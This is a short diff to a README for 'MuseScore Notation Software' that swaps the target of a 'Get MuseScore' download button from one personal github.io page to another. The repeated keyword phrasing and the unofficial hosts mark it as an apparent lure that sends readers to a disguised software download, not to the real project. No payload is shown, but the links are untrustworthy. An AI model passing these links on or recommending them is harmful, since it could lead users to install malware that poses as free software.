@@ -21,7 +21,7 @@ To begin using this **MuseScore Notation Software** and **MuseScore Music Compos
 | :--- | :--- |
 | **Get MuseScore Notation Software** | Click the button below to start using this **MuseScore Score Writer**. |
 
-[![Button](https://img.shields.io/badge/🎵-Get_MuseScore-2ea44f?style=for-the-badge)](https://bolatzelenin.github.io/.github/musescore-notation-software)
+[![Button](https://img.shields.io/badge/🎵-Get_MuseScore-2ea44f?style=for-the-badge)](https://gabrielyangqobj.github.io/.github/musescore-notation-software)
 
 ## System Requirements
 
